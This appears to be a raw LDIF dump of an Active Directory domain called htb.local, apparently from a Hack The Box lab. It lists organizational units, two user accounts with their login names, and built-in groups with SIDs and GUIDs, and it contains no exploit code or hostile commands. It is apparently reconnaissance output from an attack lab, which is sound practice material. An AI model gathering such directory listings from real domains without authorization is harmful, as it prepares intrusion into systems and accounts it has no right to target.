distinguishedName: OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
instanceType: 4
whenCreated: 20190920004512.0Z
whenChanged: 20190920004512.0Z
uSNCreated: 26063
uSNChanged: 26064
name: Helpdesk
objectGUID:: o5TOp8WzmEG11riiJ15J9w==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Andy Hislip
sn: Hislip
givenName: Andy
distinguishedName: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Emp
 loyees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920223956.0Z
whenChanged: 20190922224416.0Z
displayName: Andy Hislip
uSNCreated: 28800
uSNChanged: 32970
name: Andy Hislip
objectGUID:: yAbxsZT4YUy2cEg6WnYVpg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132136658562910820
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPfgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: andy
sAMAccountType: 805306368
userPrincipalName: andy@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Sysadmins, Information Technology, Employees, htb.local
dn: OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Sysadmins
distinguishedName: OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
 DC=local
instanceType: 4
whenCreated: 20190920004538.0Z
whenChanged: 20190920004538.0Z
uSNCreated: 26065
uSNChanged: 26066
name: Sysadmins
objectGUID:: bDUUhHkfv0SYYc2EQSpp6w==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
 DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Mark Brandt
sn: Brandt
givenName: Mark
distinguishedName: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Em
 ployees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920225730.0Z
whenChanged: 20190920225730.0Z
displayName: Mark Brandt
uSNCreated: 28825
uSNChanged: 28831
name: Mark Brandt
objectGUID:: Ym00op3FwEqFh1/oaBmf9g==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132134938502435678
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPfwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: mark
sAMAccountType: 805306368
userPrincipalName: mark@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Sales, Employees, htb.local
dn: OU=Sales,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Sales
distinguishedName: OU=Sales,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920004039.0Z
whenChanged: 20190922213920.0Z
uSNCreated: 26042
uSNChanged: 32850
name: Sales
objectGUID:: 16tJOVcG9Uqauut6PQwN5w==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Marketing, Employees, htb.local
dn: OU=Marketing,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Marketing
distinguishedName: OU=Marketing,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920004050.0Z
whenChanged: 20190922213958.0Z
uSNCreated: 26044
uSNChanged: 32854
name: Marketing
objectGUID:: B/j2tPjgjEyhnD64bC/dpw==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Reception, Employees, htb.local
dn: OU=Reception,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Reception
distinguishedName: OU=Reception,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920004159.0Z
whenChanged: 20190922213941.0Z
uSNCreated: 26047
uSNChanged: 32852
name: Reception
objectGUID:: KZzfB0GiNUKMKcGT0k/JBA==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# TPM Devices, htb.local
dn: CN=TPM Devices,DC=htb,DC=local
objectClass: top
objectClass: msTPM-InformationObjectsContainer
cn: TPM Devices
distinguishedName: CN=TPM Devices,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225117.0Z
uSNCreated: 6038
uSNChanged: 95040
showInAdvancedViewOnly: TRUE
name: TPM Devices
objectGUID:: 1PTtQhgklU2yGaHn1lUmlw==
objectCategory: CN=ms-TPM-Information-Objects-Container,CN=Schema,CN=Configura
 tion,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Builtin, htb.local
dn: CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: builtinDomain
cn: Builtin
distinguishedName: CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923111324.0Z
uSNCreated: 8199
uSNChanged: 49232
showInAdvancedViewOnly: FALSE
name: Builtin
objectGUID:: SJ+EFqFHq0eydf6K0F19qA==
creationTime: 131131487490386345
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -37108517437440
minPwdAge: 0
minPwdLength: 0
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 0
objectSid:: AQEAAAAAAAUgAAAA
serverState: 1
uASCompat: 1
modifiedCount: 421
systemFlags: -1946157056
objectCategory: CN=Builtin-Domain,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Account Operators, Builtin, htb.local
dn: CN=Account Operators,CN=Builtin,DC=htb,DC=local

# Pre-Windows 2000 Compatible Access, Builtin, htb.local
dn: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Pre-Windows 2000 Compatible Access
description: A backward compatibility group which allows read access on all us
 ers and groups in the domain
member: CN=S-1-1-0,CN=ForeignSecurityPrincipals,DC=htb,DC=local
member: CN=S-1-5-7,CN=ForeignSecurityPrincipals,DC=htb,DC=local
distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=
 local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190922231106.0Z
uSNCreated: 12366
uSNChanged: 36945
name: Pre-Windows 2000 Compatible Access
objectGUID:: /rzwaanrzEOwS9mXS1omoQ==
objectSid:: AQIAAAAAAAUgAAAAKgIAAA==
sAMAccountName: Pre-Windows 2000 Compatible Access
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Incoming Forest Trust Builders, Builtin, htb.local
dn: CN=Incoming Forest Trust Builders,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Incoming Forest Trust Builders
description: Members of this group can create incoming, one-way trusts to this
  forest
distinguishedName: CN=Incoming Forest Trust Builders,CN=Builtin,DC=htb,DC=loca
 l
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12369
uSNChanged: 12371
name: Incoming Forest Trust Builders
objectGUID:: Ts/Ol59Th0yT0FKijruCAA==
objectSid:: AQIAAAAAAAUgAAAALQIAAA==
sAMAccountName: Incoming Forest Trust Builders
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Windows Authorization Access Group, Builtin, htb.local
dn: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Windows Authorization Access Group
description: Members of this group have access to the computed tokenGroupsGlob
 alAndUniversal attribute on User objects
member: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=lo
 cal
member: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=htb,DC=local
distinguishedName: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=
 local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190919111150.0Z
uSNCreated: 12372
uSNChanged: 24478
name: Windows Authorization Access Group
objectGUID:: tyyLG4bm7UyHYlJOnOdoNg==
objectSid:: AQIAAAAAAAUgAAAAMAIAAA==
sAMAccountName: Windows Authorization Access Group
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Terminal Server License Servers, Builtin, htb.local
dn: CN=Terminal Server License Servers,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Terminal Server License Servers
description: Members of this group can update user accounts in Active Director
 y with information about license issuance, for the purpose of tracking and re
 porting TS Per User CAL usage
distinguishedName: CN=Terminal Server License Servers,CN=Builtin,DC=htb,DC=loc
 al
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12375
uSNChanged: 12377
name: Terminal Server License Servers
objectGUID:: 3ZqqquGZl0uJartnaU3slQ==
objectSid:: AQIAAAAAAAUgAAAAMQIAAA==
sAMAccountName: Terminal Server License Servers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Administrators, Builtin, htb.local
dn: CN=Administrators,CN=Builtin,DC=htb,DC=local

# Users, Builtin, htb.local
dn: CN=Users,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Users
description: Users are prevented from making accidental or intentional system-
 wide changes and can run most applications
member: CN=Domain Users,CN=Users,DC=htb,DC=local
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=htb,DC=local
member: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=htb,DC=local
distinguishedName: CN=Users,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 8203
uSNChanged: 12381
name: Users
objectGUID:: PtuEaS9ghESU7M6fxlxI8w==
objectSid:: AQIAAAAAAAUgAAAAIQIAAA==
sAMAccountName: Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Guests, Builtin, htb.local
dn: CN=Guests,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Guests
description: Guests have the same access as members of the Users group by defa
 ult, except for the Guest account which is further restricted
member: CN=Domain Guests,CN=Users,DC=htb,DC=local
member: CN=Guest,CN=Users,DC=htb,DC=local
distinguishedName: CN=Guests,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 8209
uSNChanged: 12383
name: Guests
objectGUID:: iPzcPsCEdkGECIQMB5Q3eA==
objectSid:: AQIAAAAAAAUgAAAAIgIAAA==
sAMAccountName: Guests
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Print Operators, Builtin, htb.local
dn: CN=Print Operators,CN=Builtin,DC=htb,DC=local

# Backup Operators, Builtin, htb.local
dn: CN=Backup Operators,CN=Builtin,DC=htb,DC=local

# Replicator, Builtin, htb.local
dn: CN=Replicator,CN=Builtin,DC=htb,DC=local

# Remote Desktop Users, Builtin, htb.local
dn: CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Remote Desktop Users
description: Members in this group are granted the right to logon remotely
distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923120715.0Z
uSNCreated: 8215
uSNChanged: 57411
name: Remote Desktop Users
objectGUID:: 3Hl7PUZvRkO09sPzmirCdQ==
objectSid:: AQIAAAAAAAUgAAAAKwIAAA==
sAMAccountName: Remote Desktop Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Network Configuration Operators, Builtin, htb.local
dn: CN=Network Configuration Operators,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Network Configuration Operators
description: Members in this group can have some administrative privileges to 
 manage configuration of networking features
distinguishedName: CN=Network Configuration Operators,CN=Builtin,DC=htb,DC=loc
 al
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8216
uSNChanged: 8216
name: Network Configuration Operators
objectGUID:: tQgTkhtLlUWILez5ADqWfQ==
objectSid:: AQIAAAAAAAUgAAAALAIAAA==
sAMAccountName: Network Configuration Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Performance Monitor Users, Builtin, htb.local
dn: CN=Performance Monitor Users,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Performance Monitor Users
description: Members of this group can access performance counter data locally
  and remotely
distinguishedName: CN=Performance Monitor Users,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8217
uSNChanged: 8217
name: Performance Monitor Users
objectGUID:: Aoappwj290O4NPQQNChxpA==
objectSid:: AQIAAAAAAAUgAAAALgIAAA==
sAMAccountName: Performance Monitor Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Performance Log Users, Builtin, htb.local
dn: CN=Performance Log Users,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Performance Log Users
description: Members of this group may schedule logging of performance counter
 s, enable trace providers, and collect event traces both locally and via remo
 te access to this computer
distinguishedName: CN=Performance Log Users,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8218
uSNChanged: 8218
name: Performance Log Users
objectGUID:: WlsdXcMnukKiLL1i7AJLPg==
objectSid:: AQIAAAAAAAUgAAAALwIAAA==
sAMAccountName: Performance Log Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Distributed COM Users, Builtin, htb.local
dn: CN=Distributed COM Users,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Distributed COM Users
description: Members are allowed to launch, activate and use Distributed COM o
 bjects on this machine.
distinguishedName: CN=Distributed COM Users,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8219
uSNChanged: 8219
name: Distributed COM Users
objectGUID:: 21EZwoqkp0CWQXyNgMcHfQ==
objectSid:: AQIAAAAAAAUgAAAAMgIAAA==
sAMAccountName: Distributed COM Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# IIS_IUSRS, Builtin, htb.local
dn: CN=IIS_IUSRS,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: IIS_IUSRS
description: Built-in group used by Internet Information Services.
member: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=htb,DC=local
distinguishedName: CN=IIS_IUSRS,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8220
uSNChanged: 8223
name: IIS_IUSRS
objectGUID:: Pu/4H0GSbkqzbglhF6I2Kg==
objectSid:: AQIAAAAAAAUgAAAAOAIAAA==
sAMAccountName: IIS_IUSRS
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Cryptographic Operators, Builtin, htb.local
dn: CN=Cryptographic Operators,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Cryptographic Operators
description: Members are authorized to perform cryptographic operations.
distinguishedName: CN=Cryptographic Operators,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8224
uSNChanged: 8224
name: Cryptographic Operators
objectGUID:: FdNAWUDm4UeoozxqZszwLw==
objectSid:: AQIAAAAAAAUgAAAAOQIAAA==
sAMAccountName: Cryptographic Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Event Log Readers, Builtin, htb.local
dn: CN=Event Log Readers,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Event Log Readers
description: Members of this group can read event logs from local machine
distinguishedName: CN=Event Log Readers,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8225
uSNChanged: 8225
name: Event Log Readers
objectGUID:: 7oqbrJiSxUyF8PfwfU9roA==
objectSid:: AQIAAAAAAAUgAAAAPQIAAA==
sAMAccountName: Event Log Readers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Certificate Service DCOM Access, Builtin, htb.local
dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Certificate Service DCOM Access
description: Members of this group are allowed to connect to Certification Aut
 horities in the enterprise
distinguishedName: CN=Certificate Service DCOM Access,CN=Builtin,DC=htb,DC=loc
 al
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8226
uSNChanged: 8226
name: Certificate Service DCOM Access
objectGUID:: g5QwjDnFaEmsfOt32utNaQ==
objectSid:: AQIAAAAAAAUgAAAAPgIAAA==
sAMAccountName: Certificate Service DCOM Access
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# RDS Remote Access Servers, Builtin, htb.local
dn: CN=RDS Remote Access Servers,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: RDS Remote Access Servers
description: Servers in this group enable users of RemoteApp programs and pers
 onal virtual desktops access to these resources. In Internet-facing deploymen
 ts, these servers are typically deployed in an edge network. This group needs
  to be populated on servers running RD Connection Broker. RD Gateway servers 
 and RD Web Access servers used in the deployment need to be in this group.
distinguishedName: CN=RDS Remote Access Servers,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8227
uSNChanged: 8227
name: RDS Remote Access Servers
objectGUID:: bHQqbRsWk028COd8RU5fQw==
objectSid:: AQIAAAAAAAUgAAAAPwIAAA==
sAMAccountName: RDS Remote Access Servers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# RDS Endpoint Servers, Builtin, htb.local
dn: CN=RDS Endpoint Servers,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: RDS Endpoint Servers
description: Servers in this group run virtual machines and host sessions wher
 e users RemoteApp programs and personal virtual desktops run. This group need
 s to be populated on servers running RD Connection Broker. RD Session Host se
 rvers and RD Virtualization Host servers used in the deployment need to be in
  this group.
distinguishedName: CN=RDS Endpoint Servers,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8228
uSNChanged: 8228
name: RDS Endpoint Servers
objectGUID:: UtSVmlRSh02Pn1LvG+bjqw==
objectSid:: AQIAAAAAAAUgAAAAQAIAAA==
sAMAccountName: RDS Endpoint Servers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# RDS Management Servers, Builtin, htb.local
dn: CN=RDS Management Servers,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: RDS Management Servers
description: Servers in this group can perform routine administrative actions 
 on servers running Remote Desktop Services. This group needs to be populated 
 on all servers in a Remote Desktop Services deployment. The servers running t
 he RDS Central Management service must be included in this group.
distinguishedName: CN=RDS Management Servers,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8229
uSNChanged: 8229
name: RDS Management Servers
objectGUID:: CSpttB1sP0uFN55RgTMslA==
objectSid:: AQIAAAAAAAUgAAAAQQIAAA==
sAMAccountName: RDS Management Servers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Hyper-V Administrators, Builtin, htb.local
dn: CN=Hyper-V Administrators,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Hyper-V Administrators
description: Members of this group have complete and unrestricted access to al
 l features of Hyper-V.
distinguishedName: CN=Hyper-V Administrators,CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8230
uSNChanged: 8230
name: Hyper-V Administrators
objectGUID:: GwJqNsqcjkiweLoMhhCZtQ==
objectSid:: AQIAAAAAAAUgAAAAQgIAAA==
sAMAccountName: Hyper-V Administrators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Access Control Assistance Operators, Builtin, htb.local
dn: CN=Access Control Assistance Operators,CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: group
cn: Access Control Assistance Operators
description: Members of this group can remotely query authorization attributes
  and permissions for resources on this computer.
distinguishedName: CN=Access Control Assistance Operators,CN=Builtin,DC=htb,DC
 =local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8231
uSNChanged: 8231
name: Access Control Assistance Operators
objectGUID:: AKm3nE/XC0i1XPZATi4now==
objectSid:: AQIAAAAAAAUgAAAAQwIAAA==
sAMAccountName: Access Control Assistance Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

